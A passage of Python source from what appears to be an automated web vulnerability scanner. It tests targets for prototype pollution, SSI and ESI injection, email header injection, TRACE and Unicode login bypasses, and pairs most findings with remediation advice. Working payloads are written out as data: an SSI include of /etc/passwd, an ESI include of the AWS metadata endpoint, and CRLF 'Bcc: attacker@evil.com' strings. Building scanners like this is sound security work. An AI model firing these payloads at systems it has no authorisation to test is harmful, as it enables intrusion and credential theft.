                cvss_score=5.3,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                cwe=["CWE-693"],
                remediation=(
                    "Disable the TRACE method on the web server. In Apache: "
                    "TraceEnable off. In IIS: configure Request Filtering to deny "
                    "the TRACE verb. In nginx: TRACE is disabled by default; verify "
                    "no proxy_pass is forwarding it to a backend that allows it."
                ),
            )
            vc.log(f"[headers] TRACE method enabled — XST vulnerability at {url}", "SUCCESS")
        elif _code == 200:
            vc.log("[headers] TRACE returned 200 but did not reflect canary", "INFO")
        else:
            vc.log(f"[headers] TRACE returned HTTP {_code} — method disabled", "INFO")

    except (ConnectionRefusedError, _sock.timeout, OSError) as e:
        vc.log(f"[headers] TRACE test connection failed: {e}", "INFO")
    except Exception as e:
        vc.log(f"[headers] TRACE test error: {e}", "INFO")

# ── Injection Extensions ──────────────────────────────────────────────

# ─────────────────────────────────────────────
# Server-Side Prototype Pollution
# ─────────────────────────────────────────────

_PROTO_POLLUTION_PAYLOADS = [
    (
        {"__proto__": {"fr_canary": "fracture_pp_test", "isAdmin": True, "status": 200}},
        "__proto__",
    ),
    (
        {"constructor": {"prototype": {"fr_canary": "fracture_pp_test", "isAdmin": True}}},
        "constructor.prototype",
    ),
]

_PROTO_POLLUTION_INDICATORS = re.compile(
    r"fr_canary|fracture_pp_test|"
    r"__proto__|prototype\s*pollution|"
    r"Object\.assign|Object\.defineProperty.*__proto__|"
    r"Cannot\s+set\s+propert(?:y|ies)\s+of\s+(?:undefined|null)",
    re.I,
)


def _test_prototype_pollution_server(target: dict, cfg: dict,
                                     out: "OutputManager",
                                     sess: "requests.Session",
                                     crawl_data: dict) -> None:
    """Test server-side prototype pollution via JSON POST bodies."""
    phase   = "injection"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    params  = crawl_data.get("params", [])

    # Collect candidate endpoints: form actions + param URLs (dedup)
    _seen: set = set()
    _endpoints: list = []
    for form in forms:
        action = form.get("action", url)
        if action not in _seen:
            _seen.add(action)
            _endpoints.append(action)
    for entry in params:
        ep = entry.get("url", "")
        if ep and ep not in _seen:
            _seen.add(ep)
            _endpoints.append(ep)
    if url not in _seen:
        _endpoints.insert(0, url)

    vc.log(f"[injection] Prototype pollution: testing {min(len(_endpoints), 10)} endpoints", "INFO")

    for ep in _endpoints[:10]:
        # Get baseline response (normal JSON POST)
        try:
            _bl = sess.post(ep, json={"test": "value"}, timeout=timeout,
                            headers={"Content-Type": "application/json"})
        except Exception:
            continue

        for payload, label in _PROTO_POLLUTION_PAYLOADS:
            try:
                r = sess.post(ep, json=payload, timeout=timeout,
                              headers={"Content-Type": "application/json"})
                if r is None:
                    continue

                # Strip payload reflection before checking indicators
                _body = r.text
                for _enc in ('"fr_canary"', '"fracture_pp_test"',
                             '"__proto__"', '"constructor"'):
                    _body = _body.replace(_enc, "")

                _polluted = False
                # Check 1: canary value appears in a DIFFERENT response field
                if "fracture_pp_test" in _body:
                    _polluted = True
                # Check 2: response behavior changed (different status, different
                # body length beyond a tolerance band)
                if (r.status_code != _bl.status_code and
                        r.status_code in (500, 403, 200)):
                    if abs(len(r.text) - len(_bl.text)) > max(50, len(_bl.text) * 0.3):
                        _polluted = True
                # Check 3: stack trace / error mentioning prototype
                if r.status_code == 500 and _PROTO_POLLUTION_INDICATORS.search(_body):
                    _polluted = True

                if _polluted:
                    _rq, _rp = _save_http_evidence(
                        out, phase, f"proto_pollution_{label}", r,
                        endpoint_url=ep, method="POST")
                    out.add_finding(
                        title="Server-Side Prototype Pollution",
                        url=ep, port=target["port"], risk="HIGH",
                        description=(
                            f"The endpoint at {ep} is susceptible to server-side "
                            f"prototype pollution via {label} injection in a JSON "
                            f"POST body. An attacker can inject properties into "
                            f"Object.prototype, potentially bypassing security "
                            f"checks, escalating privileges, or causing denial of "
                            f"service across all objects in the application."
                        ),
                        output=(
                            f"Endpoint: {ep}\nVector: {label}\n"
                            f"Payload: {payload}\n"
                            f"Baseline: HTTP {_bl.status_code} ({len(_bl.text)} bytes)\n"
                            f"Polluted: HTTP {r.status_code} ({len(r.text)} bytes)\n"
                            f"Response excerpt: {r.text[:400]}"
                        ),
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-prototype-pollution",
                        service=target["scheme"],
                        affected=ep,
                        owasp="A03:2025 Injection", nist="SI-10",
                        remediation=(
                            "Sanitise user-supplied JSON before merging into objects. "
                            "Use Object.create(null) for lookup maps, or use a schema "
                            "validator that rejects __proto__ and constructor keys. "
                            "Libraries like lodash (>=4.17.12) and fast-json-parse "
                            "strip prototype keys by default."
                        ),
                        cwe=["CWE-1321"],
                        cvss_score=7.3,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
                    )
                    vc.log(f"[injection] Prototype pollution via {label} at {ep}",
                           "SUCCESS")
                    break  # one vector per endpoint is enough
            except Exception:
                pass


# ─────────────────────────────────────────────
# Client-Side Prototype Pollution Detection
# ─────────────────────────────────────────────

_CLIENT_PP_SINKS = re.compile(
    r"Object\.assign\s*\(\s*\{\s*\}|"
    r"_\.merge\s*\(|_\.extend\s*\(|_\.defaultsDeep\s*\(|"
    r"\$\.extend\s*\((?:true\s*,\s*)?\{\s*\}|"
    r"Object\.setPrototypeOf|"
    r"Reflect\.(?:set|defineProperty)|"
    r"(?:query|hash|search|fragment|params)\s*[\[.].*__proto__",
    re.I,
)


def _test_prototype_pollution_client(target: dict, cfg: dict,
                                     out: "OutputManager",
                                     sess: "requests.Session",
                                     crawl_data: dict) -> None:
    """Detect potential client-side prototype pollution via static JS analysis."""
    phase   = "injection"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    links   = crawl_data.get("links", [])

    # Collect JS URLs from crawl data
    _js_urls: list = []
    for link in links:
        _href = link if isinstance(link, str) else link.get("url", "")
        if _href and _href.lower().endswith(".js"):
            _js_urls.append(_href)
    # Also try fetching the main page and extracting <script src>
    try:
        _main = sess.get(url, timeout=timeout)
        for _m in re.finditer(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']',
                              _main.text, re.I):
            _src = urllib.parse.urljoin(url, _m.group(1))
            if _src not in _js_urls:
                _js_urls.append(_src)
    except Exception:
        pass

    _found: set = set()

    for _js_url in _js_urls[:15]:
        try:
            _r = sess.get(_js_url, timeout=timeout)
            if _r.status_code != 200 or len(_r.text) < 50:
                continue
            _matches = _CLIENT_PP_SINKS.findall(_r.text)
            if _matches and _js_url not in _found:
                _found.add(_js_url)
                _match_preview = "; ".join(set(_matches))[:200]
                _pp_ev = ""
                try:
                    _pp_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', _js_url)[:50]
                    _pp_rq, _pp_rp = _save_http_evidence(
                        out, phase, f"proto_pollution_{_pp_safe}", _r)
                    _pp_ev = json.dumps(
                        [{"url": _js_url, "req": str(_pp_rq), "resp": str(_pp_rp)}])
                except Exception:
                    pass
                out.add_finding(
                    title="Potential Client-Side Prototype Pollution",
                    url=_js_url, port=target["port"], risk="MEDIUM",
                    description=(
                        f"The JavaScript file at {_js_url} contains code patterns "
                        f"that are known sinks for client-side prototype pollution "
                        f"(e.g. Object.assign, _.merge, $.extend). If user-controlled "
                        f"input (URL parameters, hash fragments, postMessage data) "
                        f"reaches these sinks without sanitisation, an attacker can "
                        f"inject properties into Object.prototype, potentially leading "
                        f"to XSS, authentication bypass, or DOM manipulation."
                    ),
                    output=(
                        f"File: {_js_url}\n"
                        f"Matching patterns: {_match_preview}\n"
                        f"File size: {len(_r.text)} bytes"
                    ),
                    sources="fracture-prototype-pollution-client",
                    service=target["scheme"],
                    output_file=_pp_ev,
                    affected=_js_url,
                    owasp="A03:2025 Injection", nist="SI-10",
                    cvss_score=6.1,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                    cwe=["CWE-1321"],
                    remediation=(
                        "Avoid using recursive merge functions (_.merge, $.extend with "
                        "deep=true, Object.assign) on user-controlled input. Use "
                        "Object.create(null) for property bags, or explicitly filter "
                        "__proto__ and constructor keys from untrusted data before merging."
                    ),
                )
                vc.log(f"[injection] Client-side PP sink found in {_js_url}", "SUCCESS")
        except Exception:
            pass

    vc.log(f"[injection] Client-side prototype pollution scan complete "
           f"({len(_found)} sinks found in {len(_js_urls)} JS files)", "INFO")


# ─────────────────────────────────────────────
# Server-Side Include (SSI) Injection
# ─────────────────────────────────────────────

_SSI_PAYLOADS = [
    ('<!--#echo var="DATE_LOCAL" -->', "echo"),
    ('<!--#echo var="DOCUMENT_URI" -->', "echo-uri"),
    ('<!--#exec cmd="echo fracture_ssi_test" -->', "exec"),
    ('<!--#include virtual="/etc/passwd" -->', "include"),
]

# Patterns that indicate SSI was processed (not just reflected)
_SSI_SUCCESS_RE = re.compile(
    r"fracture_ssi_test|"
    r"\d{4}-\d{2}-\d{2}|"      # DATE_LOCAL output
    r"root:.*:0:0:|"            # /etc/passwd
    r"Mon|Tue|Wed|Thu|Fri|Sat|Sun",  # Day name from date
    re.I,
)


def _test_ssi_injection(target: dict, cfg: dict,
                        out: "OutputManager",
                        sess: "requests.Session",
                        crawl_data: dict) -> None:
    """Test for Server-Side Include (SSI) injection in form fields."""
    phase   = "injection"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    params  = crawl_data.get("params", [])

    _tested = 0
    _found: set = set()

    # Test form fields
    for form in forms[:10]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname or _tested >= 10:
                continue
            _tested += 1
            for payload, plabel in _SSI_PAYLOADS:
                try:
                    data = {i["name"]: "test" for i in inputs if i.get("name")}
                    data[pname] = payload
                    r = sess.post(action, data=data, timeout=timeout)
                    if r is None:
                        continue
                    # Strip payload reflections
                    _body = r.text
                    for _enc in (payload,
                                 urllib.parse.quote(payload),
                                 urllib.parse.quote_plus(payload)):
                        _body = _body.replace(_enc, "")
                    if _SSI_SUCCESS_RE.search(_body) and action not in _found:
                        _found.add(action)
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"ssi_{plabel}_{pname}", r,
                            endpoint_url=action, method="POST")
                        out.add_finding(
                            title="Server-Side Include (SSI) Injection",
                            url=action, port=target["port"], risk="CRITICAL",
                            description=(
                                f"Field '{pname}' at {action} is vulnerable to SSI "
                                f"injection. The payload '{payload}' was processed by "
                                f"the server's SSI engine, producing output that was "
                                f"not simply reflected. SSI injection can lead to "
                                f"remote code execution, file disclosure, and "
                                f"server-side information leakage."
                            ),
                            output=(
                                f"Field: {pname}\nPayload: {payload}\n"
                                f"Response ({r.status_code}): {_body[:500]}"
                            ),
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-ssi-injection",
                            service=target["scheme"],
                            affected=action,
                            owasp="A03:2025 Injection", nist="SI-10",
                            remediation=(
                                "Disable SSI processing for user-uploaded content and "
                                "user-controlled input fields. If SSI must be used, "
                                "sanitise all input to remove SSI directives "
                                "(<!--# ... -->). Configure the web server to restrict "
                                "SSI exec directives."
                            ),
                            cwe=["CWE-97"],
                            cvss_score=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        )
                        vc.log(f"[injection] SSI injection via {pname} at {action}",
                               "SUCCESS")
                        break
                except Exception:
                    pass

    # Also test URL parameters
    for entry in params[:5]:
        purl = entry.get("url", "")
        for param in entry.get("params", []):
            if _tested >= 10:
                break
            _tested += 1
            for payload, plabel in _SSI_PAYLOADS[:2]:  # echo only for GET
                try:
                    r = _qs_inject(purl, param, payload, sess, timeout)
                    if r is None:
                        continue
                    _body = r.text
                    for _enc in (payload,
                                 urllib.parse.quote(payload),
                                 urllib.parse.quote_plus(payload)):
                        _body = _body.replace(_enc, "")
                    if _SSI_SUCCESS_RE.search(_body) and purl not in _found:
                        _found.add(purl)
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"ssi_{plabel}_{param}", r,
                            endpoint_url=purl, method="GET")
                        out.add_finding(
                            title="Server-Side Include (SSI) Injection",
                            url=purl, port=target["port"], risk="CRITICAL",
                            description=(
                                f"Parameter '{param}' at {purl} is vulnerable to SSI "
                                f"injection via GET request."
                            ),
                            output=(
                                f"Parameter: {param}\nPayload: {payload}\n"
                                f"Response ({r.status_code}): {_body[:500]}"
                            ),
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-ssi-injection",
                            service=target["scheme"],
                            affected=purl,
                            owasp="A03:2025 Injection", nist="SI-10",
                            cvss_score=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            cwe=["CWE-97"],
                            remediation=(
                                "Disable SSI processing for user-controlled input. "
                                "Sanitise all input to strip SSI directives."
                            ),
                        )
                        vc.log(f"[injection] SSI injection via {param} at {purl}",
                               "SUCCESS")
                        break
                except Exception:
                    pass

    vc.log(f"[injection] SSI injection scan complete ({len(_found)} findings)", "INFO")


# ─────────────────────────────────────────────
# Edge Side Include (ESI) Injection
# ─────────────────────────────────────────────

_ESI_CDN_HEADERS = re.compile(
    r"X-Cache|X-Varnish|X-CDN|Via.*varnish|Via.*squid|"
    r"Surrogate-Control|X-Akamai|X-Fastly|X-Edge",
    re.I,
)

_ESI_PAYLOADS = [
    ('<esi:include src="http://127.0.0.1/" />', "localhost",
     "Internal content from localhost"),
    ('<esi:include src="http://169.254.169.254/latest/meta-data/" />', "imds",
     "AWS IMDS metadata access via ESI"),
    ("<esi:assign name=\"var1\" value=\"fracture_esi_test\"/>$(var1)", "assign",
     "ESI variable assignment"),
]


def _test_esi_injection(target: dict, cfg: dict,
                        out: "OutputManager",
                        sess: "requests.Session",
                        crawl_data: dict) -> None:
    """Test Edge Side Include (ESI) injection when CDN/cache layer is detected."""
    phase   = "injection"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    params  = crawl_data.get("params", [])

    # Check if CDN/cache layer is present
    _has_cdn = bool(target.get("cdn"))
    if not _has_cdn:
        try:
            _probe = sess.get(url, timeout=timeout)
            for _hdr in _probe.headers:
                if _ESI_CDN_HEADERS.search(_hdr):
                    _has_cdn = True
                    break
            # Also check Surrogate-Control header for ESI support
            if "Surrogate-Control" in _probe.headers:
                _has_cdn = True
        except Exception:
            pass

    if not _has_cdn:
        vc.log("[injection] ESI: No CDN/cache layer detected — skipping ESI tests",
               "INFO")
        return

    vc.log("[injection] ESI: CDN/cache layer detected — testing for ESI injection",
           "INFO")

    _found: set = set()
    _tested = 0

    # Test form fields
    for form in forms[:5]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname or _tested >= 5:
                continue
            _tested += 1
            for payload, plabel, pdesc in _ESI_PAYLOADS:
                try:
                    data = {i["name"]: "test" for i in inputs if i.get("name")}
                    data[pname] = payload
                    r = sess.post(action, data=data, timeout=timeout)
                    if r is None:
                        continue
                    # Strip payload reflections
                    _body = r.text
                    for _enc in (payload,
                                 urllib.parse.quote(payload),
                                 urllib.parse.quote_plus(payload)):
                        _body = _body.replace(_enc, "")
                    # Check for signs ESI was processed
                    _processed = False
                    if plabel == "assign" and "fracture_esi_test" in _body:
                        _processed = True
                    elif plabel == "localhost" and (
                            "<html" in _body.lower() or
                            len(_body) > len(r.text) * 0.1):
                        _processed = True
                    elif plabel == "imds" and (
                            "ami-id" in _body or "instance-id" in _body or
                            "security-credentials" in _body):
                        _processed = True

                    if _processed and action not in _found:
                        _found.add(action)
                        _risk = "CRITICAL" if plabel == "imds" else "HIGH"
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"esi_{plabel}_{pname}", r,
                            endpoint_url=action, method="POST")
                        out.add_finding(
                            title=f"Edge Side Include (ESI) Injection — {pdesc}",
                            url=action, port=target["port"], risk=_risk,
                            description=(
                                f"Field '{pname}' at {action} is vulnerable to ESI "
                                f"injection. The CDN/cache layer processed the ESI "
                                f"directive, allowing server-side request forgery, "
                                f"information disclosure, and potentially XSS through "
                                f"the cache infrastructure."
                            ),
                            output=(
                                f"Field: {pname}\nPayload: {payload}\n"
                                f"Response ({r.status_code}): {_body[:500]}"
                            ),
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-esi-injection",
                            service=target["scheme"],
                            affected=action,
                            owasp="A03:2025 Injection", nist="SI-10",
                            cvss_score=7.5,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                            cwe=["CWE-94"],
                            remediation=(
                                "Configure the CDN/cache layer to reject or strip ESI "
                                "directives from user-supplied content. Disable ESI "
                                "processing where not required. Validate and sanitise "
                                "all user input before it reaches the cache layer."
                            ),
                        )
                        vc.log(f"[injection] ESI injection via {pname} at {action}",
                               "SUCCESS")
                        break
                except Exception:
                    pass

    # Test URL parameters
    for entry in params[:3]:
        purl = entry.get("url", "")
        for param in entry.get("params", []):
            if _tested >= 5:
                break
            _tested += 1
            for payload, plabel, pdesc in _ESI_PAYLOADS[:1]:
                try:
                    r = _qs_inject(purl, param, payload, sess, timeout)
                    if r is None:
                        continue
                    _body = r.text
                    for _enc in (payload,
                                 urllib.parse.quote(payload)):
                        _body = _body.replace(_enc, "")
                    if ("<html" in _body.lower() and purl not in _found):
                        _found.add(purl)
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"esi_{plabel}_{param}", r,
                            endpoint_url=purl, method="GET")
                        out.add_finding(
                            title=f"Edge Side Include (ESI) Injection — {pdesc}",
                            url=purl, port=target["port"], risk="HIGH",
                            description=(
                                f"Parameter '{param}' at {purl} is vulnerable to ESI "
                                f"injection via GET request."
                            ),
                            output=(
                                f"Parameter: {param}\nPayload: {payload}\n"
                                f"Response ({r.status_code}): {_body[:500]}"
                            ),
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-esi-injection",
                            service=target["scheme"],
                            affected=purl,
                            owasp="A03:2025 Injection", nist="SI-10",
                            cvss_score=7.5,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                            cwe=["CWE-94"],
                            remediation=(
                                "Strip ESI directives from user-supplied content at "
                                "the CDN/cache layer. Disable ESI where not required."
                            ),
                        )
                        vc.log(f"[injection] ESI injection via {param} at {purl}",
                               "SUCCESS")
                        break
                except Exception:
                    pass

    vc.log(f"[injection] ESI injection scan complete ({len(_found)} findings)", "INFO")


# ─────────────────────────────────────────────
# Email / SMTP Header Injection
# ─────────────────────────────────────────────

_EMAIL_FIELD_RE = re.compile(
    r"e[-_]?mail|^to$|^cc$|^bcc$|^subject$|^from$|"
    r"contact|message|recipient|sender|reply",
    re.I,
)

_SMTP_ERROR_RE = re.compile(
    r"smtp|mail.*header|header.*inject|invalid.*recipient|"
    r"relay|envelope|mailer|sendmail|postfix|exim|"
    r"Bcc.*attacker|additional.*header",
    re.I,
)


def _test_email_header_injection(target: dict, cfg: dict,
                                 out: "OutputManager",
                                 sess: "requests.Session",
                                 crawl_data: dict) -> None:
    """Test for SMTP/email header injection in contact/email forms."""
    phase   = "injection"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])

    _found: set = set()
    _tested = 0

    for form in forms[:10]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])

        # Find email-related fields
        _email_fields = [
            inp for inp in inputs
            if inp.get("name") and _EMAIL_FIELD_RE.search(inp["name"])
        ]
        if not _email_fields or _tested >= 5:
            continue
        _tested += 1

        for inp in _email_fields:
            pname = inp.get("name", "")
            if not pname:
                continue

            # Get baseline (normal submission)
            _bl_data = {i["name"]: "test" for i in inputs if i.get("name")}
            if _EMAIL_FIELD_RE.search(pname):
                _bl_data[pname] = "test@example.com"
            try:
                _bl = sess.post(action, data=_bl_data, timeout=timeout)
            except Exception:
                continue

            _payloads = [
                ("test@example.com\r\nBcc: attacker@evil.com", "CRLF"),
                ("test@example.com%0d%0aBcc: attacker@evil.com", "URL-encoded CRLF"),
                ("test@example.com\nBcc: attacker@evil.com", "LF-only"),
            ]

            for payload, plabel in _payloads:
                try:
                    data = {i["name"]: "test" for i in inputs if i.get("name")}
                    data[pname] = payload
                    r = sess.post(action, data=data, timeout=timeout)
                    if r is None:
                        continue

                    _injected = False
                    # Check 1: SMTP-related error messages
                    if _SMTP_ERROR_RE.search(r.text):
                        _injected = True
                    # Check 2: Different response than baseline (header was
                    # processed differently)
                    if (r.status_code != _bl.status_code and
                            r.status_code in (500, 400, 422)):
                        _injected = True
                    # Check 3: Response indicates mail was sent to extra recipient
                    if re.search(r"attacker@evil\.com|additional.*recipient",
                                 r.text, re.I):
                        _injected = True

                    if _injected and action not in _found:
                        _found.add(action)
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"email_inject_{pname}", r,
                            endpoint_url=action, method="POST")
                        out.add_finding(
                            title="Email Header Injection",
                            url=action, port=target["port"], risk="HIGH",
                            description=(
                                f"Field '{pname}' at {action} is vulnerable to email "
                                f"header injection via {plabel}. An attacker can inject "
                                f"additional email headers (Bcc, Cc, Subject, etc.) to "
                                f"send spam, phishing emails, or exfiltrate data through "
                                f"the application's mail function."
                            ),
                            output=(
                                f"Field: {pname}\nPayload: {payload!r}\n"
                                f"Baseline: HTTP {_bl.status_code}\n"
                                f"Injected: HTTP {r.status_code}\n"
                                f"Response: {r.text[:400]}"
                            ),
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-email-injection",
                            service=target["scheme"],
                            affected=action,
                            owasp="A03:2025 Injection", nist="SI-10",
                            remediation=(
                                "Validate all email-related input fields to reject "
                                "CR/LF characters (\\r\\n). Use a well-tested mail "
                                "library that escapes header values. Never construct "
                                "email headers from raw user input."
                            ),
                            cwe=["CWE-93"],
                            cvss_score=7.5,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
                        )
                        vc.log(f"[injection] Email header injection via {pname} "
                               f"at {action}", "SUCCESS")
                        break
                except Exception:
                    pass

    vc.log(f"[injection] Email header injection scan complete "
           f"({len(_found)} findings)", "INFO")


# ─────────────────────────────────────────────
# Unicode Normalization Bypass in Authentication
# ─────────────────────────────────────────────

# Unicode lookalikes for "admin" that may normalise to "admin" under NFKC/NFKD
_UNICODE_ADMIN_VARIANTS = [
    ("ⓐdmin",  "circled-a"),        # ⓐdmin
    ("\U0001d41admin", "bold-a"),        # 𝐚dmin
    ("admin​", "zero-width-space"), # admin + ZWSP
    ("ａdmin",  "fullwidth-a"),      # ａdmin
    ("ȧdmin", "combining-dot"),    # ȧdmin (a + combining dot above)
    ("Admın",  "dotless-i"),       # Admın
]

_LOGIN_FIELD_RE = re.compile(
    r"user|login|email|account|name|username|uid|ident",
    re.I,
)


def _test_unicode_normalization(target: dict, cfg: dict,
                                out: "OutputManager",
                                sess: "requests.Session",
                                crawl_data: dict) -> None:
    """Test Unicode normalization bypasses in authentication fields."""
    phase   = "injection"
    timeout = cfg.get("timeout", 10)
    auth    = cfg.get("auth", {})

    # Find login URL
    login_url = auth.get("login_url", "").strip()
    if not login_url:
        # Try to find from crawl data
        forms = crawl_data.get("forms", [])
        for form in forms:
            inputs = form.get("inputs", [])
            _has_password = any(
                i.get("type") == "password" for i in inputs
            )
            _has_user = any(
                _LOGIN_FIELD_RE.search(i.get("name", "")) for i in inputs
            )
            if _has_password and _has_user:
                login_url = form.get("action", "")
                break

    if not login_url:
        vc.log("[injection] Unicode normalization: no login URL found — skipping",
               "INFO")
        return

    vc.log(f"[injection] Unicode normalization: testing {login_url}", "INFO")

    # Find the login form and its fields
    _login_form = None
    forms = crawl_data.get("forms", [])
    for form in forms:
        if form.get("action", "").rstrip("/") == login_url.rstrip("/"):
            _login_form = form
            break

    if not _login_form:
        # Fetch the login page and parse
        try:
            _lp = sess.get(login_url, timeout=timeout)
            # Simple form extraction — look for password field
            _pwd_match = re.search(
                r'<input[^>]+type=["\']password["\'][^>]*name=["\']([^"\']+)',
                _lp.text, re.I,
            )
            _user_match = re.search(
                r'<input[^>]+(?:type=["\'](?:text|email)["\'])?[^>]*'
                r'name=["\']([^"\']+)["\']',
                _lp.text, re.I,
            )
            if _pwd_match and _user_match:
                _login_form = {
                    "action": login_url,
                    "method": "POST",
                    "inputs": [
                        {"name": _user_match.group(1), "type": "text"},
                        {"name": _pwd_match.group(1), "type": "password"},
                    ],
                }
        except Exception:
            pass

    if not _login_form:
        vc.log("[injection] Unicode normalization: cannot parse login form — skipping",
               "INFO")
        return

    inputs = _login_form.get("inputs", [])
    _user_field = None
    _pwd_field = None
    for inp in inputs:
        if inp.get("type") == "password":
            _pwd_field = inp.get("name")
        elif _LOGIN_FIELD_RE.search(inp.get("name", "")):
            _user_field = inp.get("name")

    if not _user_field or not _pwd_field:
        return

    action = _login_form.get("action", login_url)

    # Get baseline with a clearly-invalid username
    try:
        _bl_data = {_user_field: "fracture_invalid_user_xyzzy",
                    _pwd_field: "fracture_invalid_pass"}
        _bl = sess.post(action, data=_bl_data, timeout=timeout)
        _bl_status = _bl.status_code
        _bl_len = len(_bl.text)
    except Exception:
        return

    for variant, label in _UNICODE_ADMIN_VARIANTS:
        try:
            data = {_user_field: variant, _pwd_field: "fracture_invalid_pass"}
            r = sess.post(action, data=data, timeout=timeout)
            if r is None:
                continue

            # Compare against baseline — different response suggests the server
            # normalised the Unicode variant and treated it differently
            _diff_status = r.status_code != _bl_status
            _diff_len = abs(len(r.text) - _bl_len) > max(20, _bl_len * 0.15)
            # Check for "account locked" or "too many attempts" (normalised to
            # a real user) vs generic "invalid credentials"
            _user_exists_indicators = re.compile(
                r"locked|disabled|suspended|too many|attempt|"
                r"password.*incorrect|wrong password|"
                r"reset.*password|forgot",
                re.I,
            )
            _suggests_user_exists = (
                _user_exists_indicators.search(r.text) and
                not _user_exists_indicators.search(_bl.text)
            )

            if (_diff_status or _diff_len or _suggests_user_exists):
                _rq, _rp = _save_http_evidence(
                    out, phase, f"unicode_norm_{label}", r,
                    endpoint_url=action, method="POST")
                out.add_finding(
                    title="Unicode Normalization Bypass in Authentication",
                    url=action, port=target["port"], risk="HIGH",
                    description=(
                        f"The login form at {action} responds differently to "
                        f"Unicode variant '{variant}' ({label}) of a username "
                        f"compared to a clearly invalid username. This suggests "
                        f"the application normalises Unicode input before "
                        f"authentication lookup, which can be exploited to "
                        f"bypass username restrictions, impersonate users with "
                        f"visually similar usernames, or enumerate valid accounts."
                    ),
                    output=(
                        f"Field: {_user_field}\n"
                        f"Variant: {variant!r} ({label})\n"
                        f"Baseline (invalid user): HTTP {_bl_status} ({_bl_len} bytes)\n"
                        f"Unicode variant: HTTP {r.status_code} ({len(r.text)} bytes)\n"
                        f"Response excerpt: {r.text[:300]}"
                    ),
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-unicode-normalization",
                    service=target["scheme"],
                    affected=action,
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-5",
                    remediation=(
                        "Apply Unicode NFKC normalization to usernames BEFORE "
                        "database lookup and authentication. Reject input containing "
                        "zero-width characters, combining marks, and non-standard "
                        "Unicode codepoints in authentication fields. Use a canonical "
                        "form for username comparison."
                    ),
                    cwe=["CWE-176"],
                    cvss_score=7.5,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                )
                vc.log(f"[injection] Unicode normalization bypass ({label}) at "
                       f"{action}", "SUCCESS")
                break  # one variant is enough to confirm the issue
        except Exception:
            pass

    vc.log("[injection] Unicode normalization scan complete", "INFO")

# ── WebSocket / Cache Deception / OAuth ──────────────────────────────

# =============================================================================
# Phase: WebSocket Security Testing
# =============================================================================
# CWE-1385: Missing Origin Validation in WebSockets
# CWE-306:  Missing Authentication for Critical Function

def _phase_websocket(target: dict, cfg: dict, pm: ProgressManager,
                     out: OutputManager, sess: requests.Session,
                     crawl_data: dict) -> None:
    """WebSocket security testing — discovery, auth, origin, message injection."""
    import socket as _sock, ssl as _ssl2, select as _sel2
    import hashlib as _hashlib, base64 as _b64ws, struct as _struct_ws

    phase    = "websocket"
    url      = target["url"]
    hostname = target["hostname"]
    port     = target["port"]
    scheme   = target["scheme"]
    timeout  = cfg.get("timeout", 10)
    use_tls  = scheme == "https"

    vc.status(phase, "WebSocket Testing", "running", "Discovery", 0, 4)

    # ── Helpers ───────────────────────────────────────────────────────────

    def _ws_connect(host, p, tls, connect_timeout=None):
        ct = connect_timeout or timeout
        sock = _sock.create_connection((host, p), timeout=ct)
        sock.settimeout(None)
        if tls:
            ctx = _ssl2.create_default_context()
            if not cfg.get("verify_ssl", False):
                ctx.check_hostname = False
                ctx.verify_mode = _ssl2.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock

    def _ws_recv(sock, max_wait=5.0):
        buf = b""
        deadline = time.time() + max_wait
        while time.time() < deadline:
            rem = max(deadline - time.time(), 0.05)
            ready = _sel2.select([sock], [], [], min(rem, 1.0))
            if not ready[0]:
                if buf:
                    break
                continue
            try:
                chunk = sock.recv(8192)
            except (_sock.error, _ssl2.SSLError, OSError):
                break
            if not chunk:
                break
            buf += chunk
            if b"\r\n\r\n" in buf:
                # Read a short tail for any immediate WS frame
                _tail_end = time.time() + 0.5
                while time.time() < _tail_end:
                    r2 = _sel2.select([sock], [], [], 0.3)
                    if not r2[0]:
                        break
                    try:
                        c2 = sock.recv(8192)
                    except (_sock.error, _ssl2.SSLError, OSError):
                        break
                    if not c2:
                        break
                    buf += c2
                break
        return buf

    def _ws_close(sock):
        try:
            sock.close()
        except Exception:
            pass

    def _ws_status(raw: bytes) -> int:
        try:
